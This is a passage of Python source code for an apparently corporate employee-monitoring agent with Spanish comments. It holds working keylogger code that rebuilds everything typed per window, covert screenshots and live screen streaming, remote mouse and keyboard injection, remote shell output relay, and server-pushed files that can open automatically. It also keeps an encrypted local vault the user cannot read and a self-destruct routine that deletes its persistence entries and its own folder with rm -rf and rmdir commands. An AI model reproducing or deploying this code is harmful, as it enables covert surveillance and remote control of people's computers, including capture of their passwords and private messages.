                oldest_mtime = int(vault_files[0].stat().st_mtime)
                oldest_vault_age = max(0, now_epoch - oldest_mtime)
        except Exception:
            pass

        if elapsed_since_contact >= SITAI_MAX_OFFLINE_SECONDS or oldest_vault_age >= SITAI_MAX_OFFLINE_SECONDS:
            self.handle_self_destruct()

    def _record_server_contact(self, force_disk: bool = False):
        """
        Actualiza el sello temporal de último contacto exitoso con el servidor central.
        """
        now_ts = time.time()
        self.cfg["last_server_contact_ts"] = int(now_ts)
        if force_disk or (now_ts - self._last_contact_persist_ts) >= 300.0:
            self._last_contact_persist_ts = now_ts
            self._persist_user_cfg()

    def _save_to_sitai_vault(self, payload_dict: dict) -> Optional[Path]:
        """
        Cifra un evento con la llave pública RSA-2048 del servidor y lo guarda en disco con extensión .sitai.
        El archivo resultante es matemáticamente indescifrable en el equipo cliente.
        """
        with self._vault_lock:
            try:
                OFFLINE_VAULT_DIR.mkdir(parents=True, exist_ok=True)
                encrypted_bytes = encrypt_sitai_packet(payload_dict)
                ts_ms = int(time.time() * 1000)
                fname = f"ev_{ts_ms}_{uuid.uuid4().hex[:6]}.sitai"
                fpath = OFFLINE_VAULT_DIR / fname
                tmp_path = OFFLINE_VAULT_DIR / f".{fname}.tmp"
                tmp_path.write_bytes(encrypted_bytes)
                tmp_path.replace(fpath)

                # Rotación FIFO preventiva para acotar espacio máximo en disco
                vault_files = sorted(OFFLINE_VAULT_DIR.glob("*.sitai"))
                if len(vault_files) > SITAI_VAULT_MAX_FILES:
                    for old_f in vault_files[: len(vault_files) - SITAI_VAULT_MAX_FILES]:
                        try:
                            old_f.unlink()
                        except Exception:
                            pass
                return fpath
            except Exception:
                return None

    async def _send_or_vault_event(self, payload_dict: dict):
        """
        Intenta despachar el evento por WebSocket en tiempo real; si el equipo está sin internet
        o sin contacto con el servidor, lo cifra inmediatamente en un contenedor local .sitai.
        """
        if self.ws:
            try:
                await asyncio.wait_for(self.ws.send(json.dumps(payload_dict)), timeout=8.0)
                return
            except Exception:
                pass
        self._save_to_sitai_vault(payload_dict)

    async def sync_offline_vault_loop(self):
        """
        Revisa continuamente la bóveda local en busca de contenedores .sitai pendientes y los
        transmite al servidor en orden cronológico en cuanto hay conexión activa.
        """
        while True:
            await asyncio.sleep(3.5)
            if not self.ws:
                continue
            try:
                vault_files = sorted(OFFLINE_VAULT_DIR.glob("*.sitai"))
                for vf in vault_files[:8]:
                    if not self.ws:
                        break
                    try:
                        raw_bytes = vf.read_bytes()
                        msg = {
                            "type": "sitai_encrypted_event",
                            "filename": vf.name,
                            "data_b64": base64.b64encode(raw_bytes).decode("ascii"),
                        }
                        await asyncio.wait_for(self.ws.send(json.dumps(msg)), timeout=12.0)
                        await asyncio.sleep(0.35)
                    except Exception:
                        break
            except Exception:
                pass

    def _handle_raw_key_event(self, key_repr: str, ts: float):
        """Callback invocado por MF-01 KeyboardEventHook."""
        with self._typing_lock:
            current_win = get_active_window_title() or "Escritorio"
            if not self._typing_session_active:
                # MF-02: Inicio de Bloque y Buffer en Memoria
                self._typing_session_active = True
                self._typing_start_ts = ts
                self._typing_window = current_win
                self._keystrokes_buffer = []

            # MF-03: BufferAggregator & Timer Reset (15 segundos)
            self._typing_last_ts = ts
            self._keystrokes_buffer.append(key_repr)

            if self._typing_debounce_timer:
                try:
                    self._typing_debounce_timer.cancel()
                except Exception:
                    pass

            self._typing_debounce_timer = threading.Timer(15.0, self._on_typing_idle_timeout)
            self._typing_debounce_timer.daemon = True
            self._typing_debounce_timer.start()

    def capture_evidence_webp(self, sct: Optional[mss.base.MSSBase] = None) -> tuple[str, str]:
        """
        Captura la pantalla actual en alta resolución y la comprime en formato WebP (calidad 80, método 4).
        Si el equipo tiene múltiples monitores conectados, captura automáticamente el escritorio combinado
        completo (monitors[0]) para que la evidencia DVR abarque todas las pantallas simultáneamente.
        """
        screenshot_b64 = ""
        screenshot_fmt = "webp"
        try:
            if sct is not None:
                mon_count = max(1, len(sct.monitors) - 1)
                mon = sct.monitors[0] if mon_count > 1 else sct.monitors[min(self.current_monitor, len(sct.monitors) - 1)]
                raw_grab = sct.grab(mon)
            else:
                with mss.mss() as local_sct:
                    mon_count = max(1, len(local_sct.monitors) - 1)
                    mon = local_sct.monitors[0] if mon_count > 1 else local_sct.monitors[min(self.current_monitor, len(local_sct.monitors) - 1)]
                    raw_grab = local_sct.grab(mon)
            img = Image.frombytes("RGB", raw_grab.size, raw_grab.bgra, "raw", "BGRX")
            max_w = 3200 if mon_count > 1 else 1920
            if img.width > max_w:
                ratio = float(max_w) / img.width
                img = img.resize((max_w, int(img.height * ratio)), Image.LANCZOS)
            buf = io.BytesIO()
            try:
                img.save(buf, format="WEBP", quality=80, method=4)
            except Exception:
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=78, optimize=True)
                screenshot_fmt = "jpg"
            screenshot_b64 = base64.b64encode(buf.getvalue()).decode("ascii")
        except Exception:
            pass
        return screenshot_b64, screenshot_fmt

    def _on_typing_idle_timeout(self):
        """MF-04 & MF-05: Cierre de Sesión al expirar 15s sin pulsaciones y captura de pantalla."""
        with self._typing_lock:
            if not self._typing_session_active or not self._keystrokes_buffer:
                self._typing_session_active = False
                return

            keystrokes_snapshot = list(self._keystrokes_buffer)
            active_win = self._typing_window
            start_ts = self._typing_start_ts
            last_ts = self._typing_last_ts
            duration = max(1, round(last_ts - start_ts)) if last_ts > start_ts else 1
            count = len(keystrokes_snapshot)

            reconstructed = []
            for k in keystrokes_snapshot:
                if k == "[Espacio]":
                    reconstructed.append(" ")
                elif k == "[Enter]":
                    reconstructed.append("[Enter]\n")
                elif k == "[Tab]":
                    reconstructed.append("[Tab]")
                else:
                    reconstructed.append(k)
            text_content = "".join(reconstructed).strip()
            layout_name = get_current_keyboard_layout()

            self._keystrokes_buffer = []
            self._typing_session_active = False
            self._typing_debounce_timer = None

        # MF-05: Captura de Pantalla en Alta Resolución con mss al segundo 15 (Compresión WebP sin pérdida visual)
        screenshot_b64, screenshot_fmt = self.capture_evidence_webp()

        # MF-06: Despacho asíncrono al WebSocket o cifrado inmediato en Bóveda Offline (.sitai)
        payload = {
            "type": "keyboard_event",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "active_window": active_win,
            "duration_seconds": duration,
            "idle_pause_seconds": 15,
            "keystrokes_count": count,
            "text_content": text_content,
            "keystrokes_detail": keystrokes_snapshot[:250],
            "keyboard_layout": layout_name,
            "screenshot_b64": screenshot_b64,
            "screenshot_format": screenshot_fmt,
        }

        if self.loop and self.ws:
            asyncio.run_coroutine_threadsafe(self._send_or_vault_event(payload), self.loop)
        else:
            self._save_to_sitai_vault(payload)

    def _on_shell_output(self, session_key: str, text_chunk: str, closed: bool = False):
        if self.loop and self.ws:
            payload = json.dumps({"type": "shell_output", "session_key": session_key, "data": text_chunk, "closed": closed})
            asyncio.run_coroutine_threadsafe(self._safe_ws_send(payload), self.loop)

    def _on_user_chat_reply(self, text: str):
        if self.loop and self.ws:
            payload = json.dumps({"type": "chat_reply", "text": text})
            asyncio.run_coroutine_threadsafe(self._safe_ws_send(payload), self.loop)

    async def _safe_ws_send(self, payload_str: str):
        try:
            if self.ws:
                await self.ws.send(payload_str)
        except Exception:
            pass

    def handle_file_transfer(self, data: dict) -> dict:
        filename = os.path.basename(str(data.get("filename") or "archivo_recibido.bin")).strip() or "archivo_recibido.bin"
        dest_folder_name = "Downloads" if str(data.get("destination", "")).lower() == "downloads" else "Desktop"
        auto_open = bool(data.get("auto_open", False))
        b64_str = data.get("data_b64", "")

        try:
            raw_bytes = base64.b64decode(b64_str)
            target_dir = Path.home() / dest_folder_name
            target_dir.mkdir(parents=True, exist_ok=True)
            target_path = target_dir / filename

            if target_path.exists():
                stem = target_path.stem
                suffix = target_path.suffix
                counter = 1
                while target_path.exists():
                    target_path = target_dir / f"{stem}_{counter}{suffix}"
                    counter += 1

            target_path.write_bytes(raw_bytes)

            opened = False
            if auto_open:
                try:
                    if IS_WINDOWS and hasattr(os, "startfile"):
                        os.startfile(str(target_path))  # type: ignore[attr-defined]
                        opened = True
                    elif IS_MAC:
                        subprocess.Popen(["open", str(target_path)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        opened = True
                except Exception:
                    opened = False

            return {
                "type": "file_received",
                "ok": True,
                "filename": target_path.name,
                "saved_path": str(target_path),
                "auto_opened": opened,
            }
        except Exception as e:
            return {
                "type": "file_received",
                "ok": False,
                "filename": filename,
                "saved_path": "",
                "auto_opened": False,
                "error": str(e),
            }

    def _persist_user_cfg(self):
        clean_cfg = {k: v for k, v in self.cfg.items() if not str(k).startswith("_")}
        try:
            self.user_config_path.write_text(json.dumps(clean_cfg, indent=2, ensure_ascii=False), encoding="utf-8")
        except Exception:
            pass

    def save_alias_locally(self, new_alias: str):
        self.alias = new_alias
        self.cfg["alias"] = new_alias
        self._persist_user_cfg()

    def save_assigned_identity(self, new_agent_id: str, new_alias: str = ""):
        if new_agent_id:
            self.agent_id = new_agent_id
            self.cfg["agent_id"] = new_agent_id
        if new_alias:
            self.alias = new_alias
            self.cfg["alias"] = new_alias
        self._persist_user_cfg()

    def get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def get_monitors_info(self, sct: mss.base.MSSBase) -> List[dict]:
        monitors_list = []
        for idx, m in enumerate(sct.monitors):
            if idx == 0:
                label = f"Todos los monitores ({m['width']}x{m['height']})"
            else:
                label = f"Monitor {idx} ({m['width']}x{m['height']})"
            monitors_list.append({
                "id": idx,
                "label": label,
                "left": m["left"],
                "top": m["top"],
                "width": m["width"],
                "height": m["height"],
            })
        return monitors_list

    def capture_thumbnail_b64(self, sct: mss.base.MSSBase) -> str:
        try:
            mon_idx = self.current_monitor if 0 <= self.current_monitor < len(sct.monitors) else 1
            mon = sct.monitors[mon_idx]
            if IS_MAC and not self.macos_screen_ok:
                img = build_macos_permission_frame(1280, 720)
            else:
                try:
                    shot = sct.grab(mon)
                    img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
                except Exception:
                    if IS_MAC:
                        img = build_macos_permission_frame(1280, 720)
                    else:
                        return ""
            img.thumbnail((420, 240), Image.Resampling.BILINEAR)
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=55)
            return base64.b64encode(buf.getvalue()).decode("ascii")
        except Exception:
            return ""

    def capture_frame_packet(self, sct: mss.base.MSSBase) -> Optional[bytes]:
        try:
            if not (0 <= self.current_monitor < len(sct.monitors)):
                self.current_monitor = 1
            mon = sct.monitors[self.current_monitor]
            if IS_MAC and not self.macos_screen_ok:
                img = build_macos_permission_frame(mon["width"], mon["height"])
            else:
                try:
                    shot = sct.grab(mon)
                    img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
                except Exception:
                    if IS_MAC:
                        img = build_macos_permission_frame(mon["width"], mon["height"])
                    elif IS_WINDOWS:
                        img = build_windows_background_session_frame(
                            mon["width"],
                            mon["height"],
                            username=self.username,
                            session_id=self.session_id,
                        )
                    else:
                        return None

            orig_w, orig_h = img.size
            if self.scale_factor < 0.99:
                new_w = max(320, int(orig_w * self.scale_factor))
                new_h = max(200, int(orig_h * self.scale_factor))
                img = img.resize((new_w, new_h), Image.Resampling.BILINEAR)

            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=self.jpeg_quality)
            jpeg_bytes = buf.getvalue()

            try:
                cx, cy = self.mouse.position
                rel_x = (cx - mon["left"]) / max(1, mon["width"])
                rel_y = (cy - mon["top"]) / max(1, mon["height"])
            except Exception:
                rel_x, rel_y = -1.0, -1.0

            header_dict = {
                "m": self.current_monitor,
                "w": mon["width"],
                "h": mon["height"],
                "cx": round(rel_x, 4),
                "cy": round(rel_y, 4),
            }
            header_bytes = json.dumps(header_dict).encode("utf-8")
            return struct.pack(">I", len(header_bytes)) + header_bytes + jpeg_bytes
        except Exception:
            return None

    def handle_mouse_event(self, data: dict, sct: mss.base.MSSBase):
        try:
            if not (0 <= self.current_monitor < len(sct.monitors)):
                self.current_monitor = 1
            mon = sct.monitors[self.current_monitor]

            nx = max(0.0, min(1.0, float(data.get("x", 0.0))))
            ny = max(0.0, min(1.0, float(data.get("y", 0.0))))
            abs_x = int(mon["left"] + nx * mon["width"])
            abs_y = int(mon["top"] + ny * mon["height"])

            action = data.get("action", "move")
            btn_name = data.get("button", "left")
            btn = Button.left if btn_name == "left" else (Button.right if btn_name == "right" else Button.middle)

            self.mouse.position = (abs_x, abs_y)

            if action == "click":
                self.mouse.click(btn, 1)
            elif action == "dblclick":
                self.mouse.click(btn, 2)
            elif action == "down":
                self.mouse.press(btn)
            elif action == "up":
                self.mouse.release(btn)
            elif action == "scroll":
                dx = int(data.get("dx", 0))
                dy = int(data.get("dy", 0))
                self.mouse.scroll(dx, dy)
        except Exception:
            pass

    def handle_key_event(self, data: dict):
        try:
            action = data.get("action", "press")
            key_str = data.get("key", "")
            if not key_str:
                return

            target_key = SPECIAL_KEYS.get(key_str)
            if target_key is None and len(key_str) == 1:
                target_key = KeyCode.from_char(key_str)

            if target_key is None:
                return

            if action == "down":
                self.keyboard.press(target_key)
            elif action == "up":
                self.keyboard.release(target_key)
            elif action == "press":
                self.keyboard.press(target_key)
                self.keyboard.release(target_key)
        except Exception:
            pass

    def handle_shortcut(self, combo: str):
        try:
            mod = Key.cmd if IS_MAC else Key.ctrl
            if combo == "copy":
                with self.keyboard.pressed(mod):
                    self.keyboard.tap("c")
            elif combo == "paste":
                with self.keyboard.pressed(mod):
                    self.keyboard.tap("v")
            elif combo == "select_all":
                with self.keyboard.pressed(mod):
                    self.keyboard.tap("a")
            elif combo == "undo":
                with self.keyboard.pressed(mod):
                    self.keyboard.tap("z")
            elif combo == "alt_tab":
                with self.keyboard.pressed(Key.alt):
                    self.keyboard.tap(Key.tab)
            elif combo == "show_desktop":
                if IS_WINDOWS:
                    with self.keyboard.pressed(Key.cmd):
                        self.keyboard.tap("d")
            elif combo == "task_mgr":
                if IS_WINDOWS:
                    with self.keyboard.pressed(Key.ctrl):
                        with self.keyboard.pressed(Key.shift):
                            self.keyboard.tap(Key.esc)
            elif combo == "win_r":
                if IS_WINDOWS:
                    with self.keyboard.pressed(Key.cmd):
                        self.keyboard.tap("r")
        except Exception:
            pass

    async def stream_loop(self):
        with mss.mss() as sct:
            while True:
                if self.streaming and self.ws:
                    t0 = time.perf_counter()
                    packet = self.capture_frame_packet(sct)
                    if packet:
                        try:
                            await self.ws.send(packet)
                        except Exception:
                            break
                    elapsed = time.perf_counter() - t0
                    wait = max(0.015, (1.0 / max(1, self.target_fps)) - elapsed)
                    await asyncio.sleep(wait)
                else:
                    await asyncio.sleep(0.15)

    def _should_capture_focus_screenshot(self, res_key: Tuple[str, str], now_mono: float, idle_secs: int) -> bool:
        """MF-ST05: Anti-rafaga de capturas (8s global y 45s por recurso identico)."""
        if idle_secs >= 180 or (IS_MAC and not self.macos_screen_ok):
            return False
        if self._last_focus_shot_mono > 0 and (now_mono - self._last_focus_shot_mono) < 8.0:
            return False
        prev_shot = self._recent_resource_shots.get(res_key, 0.0)
        if prev_shot > 0 and (now_mono - prev_shot) < 45.0:
            return False
        return True

    def capture_focus_evidence_webp(self) -> Tuple[str, str]:
        """MF-ST06: Captura ligera WebP calidad 75 (max 1440px / 2560px multi-monitor)."""
        try:
            with mss.mss() as local_sct:
                mon_count = max(1, len(local_sct.monitors) - 1)
                mon = local_sct.monitors[0] if mon_count > 1 else local_sct.monitors[min(self.current_monitor, len(local_sct.monitors) - 1)]
                raw_grab = local_sct.grab(mon)
            img = Image.frombytes("RGB", raw_grab.size, raw_grab.bgra, "raw", "BGRX")
            max_w = 2560 if mon_count > 1 else 1440
            if img.width > max_w:
                ratio = float(max_w) / img.width
                img = img.resize((max_w, int(img.height * ratio)), Image.Resampling.BILINEAR)
            buf = io.BytesIO()
            try:
                img.save(buf, format="WEBP", quality=75, method=4)
                return base64.b64encode(buf.getvalue()).decode("ascii"), "webp"
            except Exception:
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=74, optimize=True)
                return base64.b64encode(buf.getvalue()).decode("ascii"), "jpg"
        except Exception:
            return "", "webp"

    def _drain_resource_slices(self) -> List[dict]:
        drained: List[dict] = []
        for (app_n, res_t, cat_t), val in list(self._resource_slices_acc.items()):
            whole = int(val)
            if whole >= 1:
                self._resource_slices_acc[(app_n, res_t, cat_t)] = max(0.0, val - whole)
                drained.append({"app_name": app_n, "resource_title": res_t, "category_tag": cat_t, "seconds": whole})
        return drained

    async def focus_monitor_loop(self):
        """MF-ST04: Sondeo ligero cada 0.8s con estabilizacion de 1.8s para App y Pestana."""
        last_mono = time.monotonic()
        while True:
            await asyncio.sleep(0.8)
            now_mono = time.monotonic()
            dt = max(0.0, min(4.0, now_mono - last_mono))
            last_mono = now_mono

            idle_secs = get_idle_seconds()
            ctx = inspect_foreground_context()
            cur_key = (ctx["app_name"], ctx["resource_title"])
            stable_key = (self._stable_ctx["app_name"], self._stable_ctx["resource_title"])

            if cur_key == stable_key:
                if self._candidate_hold_secs > 0:
                    s_tup = (self._stable_ctx["app_name"], self._stable_ctx["resource_title"], self._stable_ctx["category_tag"])
                    self._resource_slices_acc[s_tup] = self._resource_slices_acc.get(s_tup, 0.0) + self._candidate_hold_secs
                self._candidate_key = None
                self._candidate_ctx = None
                self._candidate_hold_secs = 0.0
                if idle_secs < 180:
                    s_tup = (ctx["app_name"], ctx["resource_title"], ctx["category_tag"])
                    self._resource_slices_acc[s_tup] = self._resource_slices_acc.get(s_tup, 0.0) + dt
                continue

            if self._candidate_key != cur_key:
                if self._candidate_hold_secs > 0 and idle_secs < 180:
                    s_tup = (self._stable_ctx["app_name"], self._stable_ctx["resource_title"], self._stable_ctx["category_tag"])
                    self._resource_slices_acc[s_tup] = self._resource_slices_acc.get(s_tup, 0.0) + self._candidate_hold_secs
                self._candidate_key = cur_key
                self._candidate_ctx = ctx
                self._candidate_since_mono = now_mono
                self._candidate_hold_secs = dt if idle_secs < 180 else 0.0
                continue

            if idle_secs < 180:
                self._candidate_hold_secs += dt

            if (now_mono - self._candidate_since_mono) >= 1.8:
                prev_ctx = self._stable_ctx
                prev_dur = max(1, round(self._candidate_since_mono - self._stable_started_mono))
                self._stable_ctx = ctx
                self._stable_started_mono = self._candidate_since_mono
                self.last_window_title = ctx["full_label"]
                self.window_started_at = now_mono

                if self._candidate_hold_secs > 0:
                    n_tup = (ctx["app_name"], ctx["resource_title"], ctx["category_tag"])
                    self._resource_slices_acc[n_tup] = self._resource_slices_acc.get(n_tup, 0.0) + self._candidate_hold_secs
                self._candidate_key = None
                self._candidate_ctx = None
                self._candidate_hold_secs = 0.0

                sct_b64, sct_fmt = "", "webp"
                if self._should_capture_focus_screenshot(cur_key, now_mono, idle_secs):
                    sct_b64, sct_fmt = await asyncio.to_thread(self.capture_focus_evidence_webp)
                    if sct_b64:
                        shot_t = time.monotonic()
                        self._last_focus_shot_mono = shot_t
                        self._recent_resource_shots[cur_key] = shot_t
                        if len(self._recent_resource_shots) > 60:
                            cutoff = shot_t - 120.0
                            self._recent_resource_shots = {k: v for k, v in self._recent_resource_shots.items() if v >= cutoff}

                ev_payload = {
                    "type": "focus_switch_event",
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "app_name": ctx["app_name"],
                    "app_id": ctx["app_id"],
                    "resource_title": ctx["resource_title"],
                    "category_tag": ctx["category_tag"],
                    "active_window": ctx["full_label"],
                    "previous_window": prev_ctx["full_label"],
                    "previous_app": prev_ctx["app_name"],
                    "previous_resource": prev_ctx["resource_title"],
                    "duration_seconds": prev_dur,
                    "screenshot_b64": sct_b64,
                    "screenshot_format": sct_fmt,
                }
                await self._send_or_vault_event(ev_payload)

    async def telemetry_loop(self):
        with mss.mss() as sct:
            tick = 0
            last_tick_time = time.monotonic()
            while True:
                await asyncio.sleep(4.0)
                tick += 1
                now_mono = time.monotonic()
                delta_secs = max(1, round(now_mono - last_tick_time))
                last_tick_time = now_mono
                now_ts_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                idle_secs = get_idle_seconds()
                ctx = inspect_foreground_context()
                current_win = ctx["full_label"]
                app_name = ctx["app_name"]
                resource_slices = self._drain_resource_slices()

                log_events = []
                away_alert_triggered = False

                # Detectar transiciones de inactividad (Estilo Teams)
                if idle_secs >= 180:
                    self.max_idle_reached = max(self.max_idle_reached, idle_secs)
                    if not self.was_idle_3m:
                        self.was_idle_3m = True
                        log_events.append({
                            "category": "IDLE",
                            "message": f"Equipo entró en estado inactivo tras 3 minutos sin entrada (Ventana: {current_win})",
                            "duration_seconds": idle_secs,
                            "timestamp": now_ts_str,
                            "active_window": current_win,
                        })
                    if idle_secs >= 600 and not self.was_away_10m:
                        self.was_away_10m = True
                        away_alert_triggered = True
                        log_events.append({
                            "category": "IDLE",
                            "message": f"Alerta de ausencia prolongada: superó 10 minutos sin movimiento de mouse ni teclado (Ventana: {current_win})",
                            "duration_seconds": idle_secs,
                            "timestamp": now_ts_str,
                            "active_window": current_win,
                        })
                elif idle_secs < 15 and self.was_idle_3m:
                    log_events.append({
                        "category": "RESUME",
                        "message": f"El usuario retomó actividad después de {format_duration_es(self.max_idle_reached)} de inactividad",
                        "duration_seconds": self.max_idle_reached,
                        "timestamp": now_ts_str,
                        "active_window": current_win,
                    })
                    self.was_idle_3m = False
                    self.was_away_10m = False
                    self.max_idle_reached = 0

                # 3. Modo DVR de Eventos: Captura de pantalla en WebP cuando ocurre cualquier evento de bitácora
                if log_events:
                    ev_sct_b64, ev_sct_fmt = self.capture_evidence_webp(sct)
                    if ev_sct_b64:
                        for ev_item in log_events:
                            ev_item["screenshot_b64"] = ev_sct_b64
                            ev_item["screenshot_format"] = ev_sct_fmt

                if self.ws:
                    try:
                        _, _, is_bg = get_windows_session_context() if IS_WINDOWS else (None, self.username, False)
                        payload = {
                            "type": "telemetry",
                            "idle_seconds": idle_secs,
                            "active_window": current_win,
                            "app_name": app_name,
                            "resource_title": ctx["resource_title"],
                            "category_tag": ctx["category_tag"],
                            "resource_slices": resource_slices,
                            "delta_seconds": delta_secs,
                            "away_alert": away_alert_triggered,
                            "current_monitor": self.current_monitor,
                            "monitors": self.get_monitors_info(sct),
                            "session_id": self.session_id,
                            "session_background": is_bg,
                            "log_events": log_events,
                        }
                        if tick % 3 == 1:
                            thumb_b64 = self.capture_thumbnail_b64(sct)
                            payload["thumbnail"] = thumb_b64
                            if IS_WINDOWS and not thumb_b64:
                                payload["session_background"] = True
                        await asyncio.wait_for(self.ws.send(json.dumps(payload)), timeout=8.0)
                        self._record_server_contact(force_disk=False)
                        continue
                    except Exception:
                        try:
                            if self.ws:
                                await self.ws.close()
                        except Exception:
                            pass
                        self.ws = None

                # Verificar si se alcanzó el plazo máximo de 30 días sin contacto con el servidor
                self._init_or_verify_offline_deadline()

                # Si estamos sin conexión y ocurrieron cambios de ventana o inactividad, cifrarlos en .sitai
                if log_events or away_alert_triggered or resource_slices:
                    self._save_to_sitai_vault({
                        "type": "offline_telemetry_batch",
                        "timestamp": now_ts_str,
                        "delta_seconds": delta_secs,
                        "is_active": (idle_secs < 180),
                        "app_name": app_name,
                        "resource_title": ctx["resource_title"],
                        "category_tag": ctx["category_tag"],
                        "resource_slices": resource_slices,
                        "away_alert": away_alert_triggered,
                        "log_events": log_events,
                    })

    def handle_self_destruct(self):
        """
        Micro-Función W3: Autodestrucción remota o por expiración de 30 días offline.
        Elimina el Watchdog del sistema operativo, el arranque automático, la bóveda cifrada (.sitai),
        los certificados locales y termina el proceso de forma definitiva (os._exit(0)).
        """
        try:
            import shutil
            if OFFLINE_VAULT_DIR.exists():
                try:
                    shutil.rmtree(OFFLINE_VAULT_DIR, ignore_errors=True)
                except Exception:
                    pass
            if IS_WINDOWS:
                no_win = getattr(subprocess, "CREATE_NO_WINDOW", 0)
                for task_name in ("ServicioMonitoreoCorporativoWatchdog", "ServicioMonitoreoCorporativo"):
                    subprocess.run(
                        ["schtasks", "/delete", "/tn", task_name, "/f"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        creationflags=no_win,
                    )
                for hive in ("HKCU", "HKLM"):
                    subprocess.run(
                        ["reg", "delete", f"{hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "ServicioMonitoreoCorporativo", "/f"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        creationflags=no_win,
                    )
                for env_key, startup_leaf in (("APPDATA", "Startup"), ("ProgramData", "StartUp")):
                    base_env = os.environ.get(env_key, "")
                    if base_env:
                        vbs = Path(base_env) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / startup_leaf / "ServicioMonitoreoCorporativo.vbs"
                        if vbs.exists():
                            try:
                                vbs.unlink()
                            except Exception:
                                pass
                for cfg_f in BASE_DIR.glob("config_agent*.json"):
                    try:
                        cfg_f.unlink()
                    except Exception:
                        pass
                for fname in ("agent_client.crt", "agent_client.key"):
                    fp = BASE_DIR / fname
                    if fp.exists():
                        fp.unlink()
                if "monitoreoempresa" in str(BASE_DIR).lower():
                    subprocess.Popen(
                        f'cmd.exe /c timeout /t 2 /nobreak >nul & rmdir /s /q "{BASE_DIR}"',
                        shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        creationflags=no_win,
                    )
            elif IS_MAC:
                plist_path = Path.home() / "Library" / "LaunchAgents" / "mx.sitai.jobmonitor.agent.plist"
                if plist_path.exists():
                    try:
                        plist_path.unlink()
                    except Exception:
                        pass
                for app_bundle in (
                    Path("/Applications/JOB-Monitor Agent.app"),
                    Path.home() / "Applications" / "JOB-Monitor Agent.app",
                ):
                    if app_bundle.exists():
                        try:
                            shutil.rmtree(app_bundle, ignore_errors=True)
                        except Exception:
                            pass
                if "monitoreoempresa" in str(BASE_DIR).lower():
                    for cfg_f in BASE_DIR.glob("config_agent*.json"):
                        try:
                            cfg_f.unlink()
                        except Exception:
                            pass
                    for fname in ("agent_client.crt", "agent_client.key"):
                        fp = BASE_DIR / fname
                        if fp.exists():
                            fp.unlink()
                    subprocess.Popen(
                        f'sleep 2; rm -rf "{BASE_DIR}" >/dev/null 2>&1 || true',
                        shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                uid = os.getuid()
                subprocess.Popen(
                    f"sleep 1; launchctl bootout gui/{uid}/mx.sitai.jobmonitor.agent >/dev/null 2>&1 || true",
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
        except Exception:
            pass
        os._exit(0)

    async def macos_permission_heal_loop(self):
        """
        En macOS, si el agente arrancó antes de que el usuario activara Grabación de Pantalla o Accesibilidad,
        sondea cada 3.5s. En cuanto detecta que cualquiera de los permisos fue concedido, reinicia el proceso
        de forma limpia para que launchd (KeepAlive=true) lo relance al instante con captura de video y teclado al 100%.
        """
        if not IS_MAC or (self.macos_screen_ok and self.macos_ax_ok):
            return
        exe = sys.executable
        is_app_bin = "JOBMonitorAgent" in os.path.basename(exe)
        cmd = [exe, "--check-screen-only"] if is_app_bin else [exe, str(Path(__file__).resolve()), "--check-screen-only"]
        while True:
            await asyncio.sleep(3.5)
            # 1. Recuperación de Grabación de Pantalla
            if not self.macos_screen_ok:
                try:
                    proc = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                    rc = await asyncio.wait_for(proc.wait(), timeout=3.0)
                    if rc == 0:
                        os._exit(0)
                except Exception:
                    pass

            # 2. Recuperación de Accesibilidad (Teclado)
            if not self.macos_ax_ok:
                try:
                    if check_macos_accessibility_permission(request_if_missing=False):
                        os._exit(0)
                except Exception:
                    pass

            if self.macos_screen_ok and self.macos_ax_ok:
                break

    def _build_ssl_context(self) -> Optional[ssl.SSLContext]:
        """
        Micro-Función S2: Construye el contexto TLS para conexiones wss:// y carga
        automáticamente el Certificado X.509 de Cliente (mTLS) si está presente junto al agente.
        """
        if not self.server_url.startswith("wss://"):
            return None
        try:
            import certifi
            ssl_ctx = ssl.create_default_context(cafile=certifi.where())
        except Exception:
            ssl_ctx = ssl.create_default_context()

        cert_name = str(self.cfg.get("mtls_cert") or "agent_client.crt").strip()
        key_name = str(self.cfg.get("mtls_key") or "agent_client.key").strip()
        cert_path = BASE_DIR / cert_name
        key_path = BASE_DIR / key_name
        if cert_path.exists() and key_path.exists():
            try:
                ssl_ctx.load_cert_chain(certfile=str(cert_path), keyfile=str(key_path))
            except Exception:
                pass
        return ssl_ctx

    async def run_forever(self):
        self.loop = asyncio.get_running_loop()
        if not self.keyboard_hook:
            self.keyboard_hook = KeyboardEventHook(on_key_callback=self._handle_raw_key_event)
            self.keyboard_hook.start()
        focus_bg_task = asyncio.create_task(self.focus_monitor_loop())
        telem_bg_task = asyncio.create_task(self.telemetry_loop())
        vault_sync_task = asyncio.create_task(self.sync_offline_vault_loop())
        perm_bg_task = asyncio.create_task(self.macos_permission_heal_loop())

        while True:
            try:
                ssl_ctx = self._build_ssl_context()
                async with websockets.connect(
                    self.server_url,
                    ssl=ssl_ctx,
                    max_size=25 * 1024 * 1024,
                    ping_interval=20,
                    ping_timeout=20,
                ) as ws:
                    self.ws = ws
                    self.streaming = False
                    self.loop = asyncio.get_running_loop()
                    if not self.keyboard_hook:
                        self.keyboard_hook = KeyboardEventHook(on_key_callback=self._handle_raw_key_event)
                        self.keyboard_hook.start()

                    if IS_MAC:
                        self.macos_screen_ok = check_macos_screen_permission(request_if_missing=True)
